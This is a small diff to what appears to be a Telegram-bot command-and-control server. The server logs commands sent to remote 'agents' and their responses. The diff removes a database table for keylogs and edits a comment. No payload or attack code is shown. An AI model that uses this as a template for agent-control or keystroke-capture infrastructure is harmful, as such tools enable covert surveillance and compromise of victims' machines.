@@ -51,8 +51,6 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS logs
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT,
                   response TEXT, timestamp TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, log TEXT, timestamp TEXT)''')
     conn.commit()
     conn.close()
 
@@ -144,7 +142,7 @@ async def send_command_to_agent(agent_id: str, cmd: str, args: dict = None) -> b
         return False
 
 # ===================================================================
-# HANDLER: Agent Registration
+# HANDLER: Agent Registration (JSON format)
 # ===================================================================
 @dp.message(lambda msg: msg.text and msg.text.startswith("/register"))
 async def handle_register(message: types.Message):
